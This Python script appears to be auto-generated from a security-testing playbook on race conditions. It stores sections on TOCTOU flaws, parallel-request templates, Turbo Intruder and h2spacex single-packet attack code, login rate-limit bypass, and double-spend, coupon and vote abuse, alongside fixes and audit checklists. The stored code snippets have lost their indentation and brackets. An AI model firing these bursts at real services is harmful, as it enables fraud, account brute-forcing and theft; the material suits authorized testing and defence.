#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/race-condition

Skill: SKILL: Race Conditions — Testing & Exploitation Playbook
Desc : >-

Run:  python hack-skills-race-condition.py --help
      python hack-skills-race-condition.py --list
      python hack-skills-race-condition.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/race-condition'
TITLE = 'SKILL: Race Conditions — Testing & Exploitation Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: race-condition", "description: >-", "Race condition and TOCTOU testing for web apps. Use when testing one-time operations, concurrent HTTP abuse, rate-limit bypass, Turbo Intruder gates, HTTP/2 single-packet attacks, and CWE-362-style synchronization gaps."],
    'skill-race-conditions-testing-exploitation-playbook': [],
    '0-quick-start-what-to-test-first': ["Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:", "**First moves (conceptual)**:", "1. Capture the **state-changing** request in a proxy.", "2. Send **20\u2013100** copies **as simultaneously as your tooling allows**.", "3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**."],
    '1-core-concept': [],
    '1-1-toctou-time-of-check-to-time-of-use': ["Thread A                    Thread B", "+-- CHECK (resource OK)      |", "+-- USE / UPDATE             |", "**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step."],
    '1-2-non-atomic-read-then-write': ["Typical vulnerable pseudo-flow:", "```text", "balance = SELECT balance FROM accounts WHERE id = ?", "if balance >= amount:", "UPDATE accounts SET balance = balance - ? WHERE id = ?", "Two concurrent requests can both pass the `if` before either `UPDATE` commits."],
    '1-3-database-level-vs-application-level-locking-gaps': ["**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes \u2014 test whether the app **enforces** them on the hot path."],
    '2-attack-patterns': [],
    '2-1-limit-overrun-double-redeem-double-claim': ["Send the **same** authenticated request many times in parallel:", "```http", "POST /api/v1/rewards/claim HTTP/1.1", "Host: target.example", "Authorization: Bearer <token>", "Content-Type: application/json", "{\"reward_id\":\"welcome_bonus\"}", "**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows."],
    '2-2-rate-limit-bypass-via-simultaneity': ["If limits are implemented as **counters checked per request** without atomic increment:", "```http", "POST /api/v1/login HTTP/1.1", "Host: target.example", "Content-Type: application/json", "{\"email\":\"victim@example.com\",\"password\":\"wrong\"}", "Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.", "**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window."],
    '2-3-multi-step-exploitation-beat-the-pipeline': ["Workflow: `create \u2192 pay \u2192 confirm`. If **confirm** does not cryptographically bind to **pay** completion:", "1. Start two parallel pipelines from the same session/item.", "2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.", "**Success signal**: item marked paid/shipped without matching payment, or state skips backward."],
    '3-http-1-1-last-byte-synchronization': ["**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.", "```text", "Client 1: [headers + body - 1 byte] ----hold----+", "Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together", "Client N: [headers + body - 1 byte] ----hold----+", "**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.", "**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see \u00a75) as the practical stand-in for synchronized release."],
    '4-http-2-single-packet-attack': ["**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.", "**Burp Repeater (modern workflows)**:", "1. Open multiple tabs or select multiple requests.", "2. Use **Send group (parallel)** / **single-packet attack** where available.", "3. Prefer HTTP/2 to the target if supported.", "```text", "[ Req A stream ]", "[ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool", "[ Req C stream ]", "**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization."],
    '5-turbo-intruder-templates': ["Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension)."],
    '5-1-template-1-same-endpoint-gate-release': ["**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.", "**Core pattern** (repeat N times, then release):", "```python", "for _ in range(N):", "engine.queue(request, gate='race1')", "engine.openGate('race1')", "```python", "def queueRequests(target, wordlists):", "engine = RequestEngine(endpoint=target.endpoint,", "concurrentConnections=30,", "requestsPerConnection=30,", "pipeline=False,", "engine=Engine.THREADED,", "maxRetriesPerRequest=0", "for i in range(30):", "engine.queue(target.req, gate='race1')", "engine.openGate('race1')", "def handleResponse(req, interesting):", "table.add(req)", "**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):", "```http", "x-request: %s", "Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) \u2014 keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep."],
    '5-2-template-2-multi-endpoint-same-gate': ["**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.", "```python", "def queueRequests(target, wordlists):", "engine = RequestEngine(endpoint=target.endpoint,", "concurrentConnections=30,", "requestsPerConnection=30,", "pipeline=False,", "engine=Engine.THREADED,", "maxRetriesPerRequest=0", "engine.queue(post_to_target1, gate='race1')", "for _ in range(30):", "engine.queue(get_target2, gate='race1')", "engine.openGate('race1')", "Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines \u2014 consult upstream docs for your Burp version)."],
    '6-cve-reference-cve-2022-4037': ["**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** \u2014 third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.", "**Takeaway for testers**: email verification, OAuth linking, and \"confirm ownership\" flows are high-value race targets \u2014 not only coupons and balances.", "**References (official / neutral)**:", "- [NVD \u2014 CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)", "- GitLab security advisories and vendor CVE JSON for affected version ranges"],
    '7-tools': [],
    '8-decision-tree': ["```text", "START: state-changing API?", "NO -----------+---------- YES", "stop here              one-time / balance / verify?", "+-------------------------+-------------------------+", "coupon-like                 rate limit                  multi-step", "parallel same req          parallel vs serial         parallel pipelines", "duplicate success?           limit exceeded?          state mismatch?", "/       \\                    /       \\                  /       \\", "YES       NO                 YES       NO               YES       NO", "report +    try HTTP/2        report +    try TI        report +   deepen", "evidence    single-packet      evidence    gates                     per-step", "+----+----+                  +----+----+                +----+----+", "tool pick                    tool pick                  tool pick", "v                            v                          v", "Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs", "**How to confirm (evidence checklist)**:", "1. **Reproducible** duplicate success under parallelism, not flaky single retries.", "2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.", "3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).", "**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `skills/business-logic-vulnerabilities/SKILL.md`; this file focuses on **concurrency and transport-layer synchronization**."],
    '9-http-2-single-packet-attack-detailed-mechanics': [],
    '9-1-tcp-nagle-algorithm-frame-coalescing': ["TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).", "```text", "Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]", "\u2193 TCP Nagle coalescing \u2193", "TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  \u2190 one packet on the wire", "- `TCP_NODELAY` **disabled** (default) \u2192 Nagle active \u2192 coalescing happens naturally", "- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames", "- Practical limit: ~20\u201330 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization"],
    '9-2-server-side-request-queue-processing': ["```text", "NIC IRQ \u2192 kernel recv buffer \u2192 HTTP/2 demuxer \u2192 concurrent dispatch", "\u250c\u2500 Stream 1 \u2192 worker thread A \u2500\u2510", "\u251c\u2500 Stream 3 \u2192 worker thread B \u2500\u2524  sub-microsecond spacing", "\u2514\u2500 Stream 5 \u2192 worker thread C \u2500\u2518", "1. Single `recv()` syscall returns the entire segment", "2. HTTP/2 frame parser demultiplexes streams from same segment", "3. Dispatcher fans out to application worker pool", "First-to-last request dispatch gap: **< 100 \u03bcs** on modern servers \u2014 orders of magnitude tighter than HTTP/1.1 last-byte sync (~1\u20135 ms network jitter)."],
    '9-3-http-2-vs-http-1-1-last-byte-comparison': [],
    '9-4-practical-execution-with-h2spacex': ["```python", "import h2spacex", "h2_conn = h2spacex.H2OnTCPSocket(", "hostname='target.example.com',", "port_number=443", "headers_list = []", "for i in range(20):", "headers_list.append([", "(':method', 'POST'),", "(':path', '/api/v1/rewards/claim'),", "(':authority', 'target.example.com'),", "(':scheme', 'https'),", "('content-type', 'application/json'),", "('authorization', 'Bearer TOKEN'),", "h2_conn.setup_connection()", "h2_conn.send_ping_frame()", "h2_conn.send_multiple_requests_at_once(", "headers_list,", "body_list=[b'{\"reward_id\":\"welcome_bonus\"}'] * 20", "responses = h2_conn.read_multiple_responses()"],
    '10-database-isolation-level-exploitation-matrix': [],
    'read-committed-toctou-most-common-in-production': ["```sql", "-- Thread A                            -- Thread B", "SELECT balance FROM accounts           SELECT balance FROM accounts", "WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100", "-- app: 100 >= 100 \u2713                   -- app: 100 >= 100 \u2713", "UPDATE accounts SET balance =          UPDATE accounts SET balance =", "balance - 100 WHERE id=1;             balance - 100 WHERE id=1;", "COMMIT; -- balance = 0                 COMMIT; -- balance = -100 \u2190 double-spend", "**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits."],
    'repeatable-read-phantom-insert': ["```sql", "-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)", "SELECT count(*) FROM claims            SELECT count(*) FROM claims", "WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';", "-- returns 0 (snapshot)                -- returns 0 (snapshot)", "INSERT INTO claims ...;                INSERT INTO claims ...;", "COMMIT; -- succeeds                    COMMIT; -- succeeds \u2190 duplicate claim", "**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level."],
    'serializable-advisory-lock-bypass': ["```sql", "-- Application intends: one lock per coupon", "SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));", "-- Bypass vectors:", "--   1. Lock is session-scoped but transaction rolls back \u2192 lock persists, next txn skips", "--   2. Different code path reaches claim logic without acquiring the lock", "--   3. Attacker triggers claim via alternative API endpoint that lacks locking"],
    'quick-audit-checklist': ["```text", "\u25a1 SHOW TRANSACTION ISOLATION LEVEL \u2014 what level is the database running?", "\u25a1 Does the hot path use SELECT ... FOR UPDATE or explicit row locks?", "\u25a1 Is the check-then-act sequence inside a single transaction?", "\u25a1 Are UNIQUE constraints enforced on the critical state table?", "\u25a1 Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?"],
    '11-limit-overrun-attack-patterns': [],
    '11-1-coupon-promo-code-reuse': ["```text", "Target:   POST /api/apply-coupon {\"code\":\"SUMMER50\"}", "Expected: One use per user", "Attack:   20 parallel identical requests", "Evidence: Multiple 200 responses, final order total = N \u00d7 discount applied", "Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout)."],
    '11-2-vote-rating-manipulation': ["```text", "Target:   POST /api/vote {\"post_id\":123,\"direction\":\"up\"}", "Expected: One vote per user per post", "Attack:   50 parallel vote requests", "Evidence: Vote count += N, or DB shows multiple vote rows for same user+post"],
    '11-3-balance-double-spend': ["```text", "Target:   POST /api/transfer {\"to\":\"attacker\",\"amount\":100}", "Balance:  Exactly 100", "Attack:   2+ parallel transfers", "Evidence: Both succeed, sender balance goes negative, recipient receives 200", "Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult."],
    '11-4-inventory-oversell': ["```text", "Target:   POST /api/purchase {\"item_id\":\"limited_edition\",\"qty\":1}", "Stock:    1 remaining", "Attack:   20 parallel purchase requests", "Evidence: Multiple orders created, stock counter goes negative", "Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently."],
    '11-5-referral-signup-bonus': ["```text", "Target:   POST /api/referral/claim {\"code\":\"REF_ABC\"}", "Expected: One claim per referred user", "Attack:   Parallel claims from same session", "Evidence: Bonus credited to referrer multiple times"],
    '12-single-packet-multi-endpoint-attack': ["Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously."],
    'pattern-1-state-check-state-mutate': ["```text", "Single TCP segment:", "Stream 1: GET  /api/balance       \u2190 probe pre-state", "Stream 3: POST /api/transfer      \u2190 mutate", "Stream 5: POST /api/transfer      \u2190 mutate (duplicate)", "Stream 7: GET  /api/balance       \u2190 probe post-state", "Balance inconsistency between stream 1 and stream 7 confirms the race window was hit."],
    'pattern-2-cross-resource-race': ["```text", "Single TCP segment:", "Stream 1: POST /api/coupon/apply   \u2190 apply discount", "Stream 3: POST /api/order/checkout \u2190 finalize order", "If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price."],
    'pattern-3-auth-verification-privileged-action': ["```text", "Single TCP segment:", "Stream 1: POST /api/email/verify?token=TOKEN  \u2190 verify email", "Stream 3: POST /api/account/upgrade            \u2190 requires verified email", "Upgrade may succeed during the brief window where verification is processing but not yet committed."],
    'practical-setup': ["Burp Repeater: add requests targeting **different paths** to the same group \u2192 \"Send group (single packet)\".", "```python", "headers_balance = [(':method','GET'), (':path','/api/balance'), ...]", "headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]", "all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]", "all_bodies = [b''] + [b'{\"to\":\"attacker\",\"amount\":100}']*5 + [b'']", "h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)"],
    'related': ["- **business-logic-vulnerabilities** \u2014 workflow, coupon abuse, and logic-first checklists (`../business-logic-vulnerabilities/SKILL.md`)."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()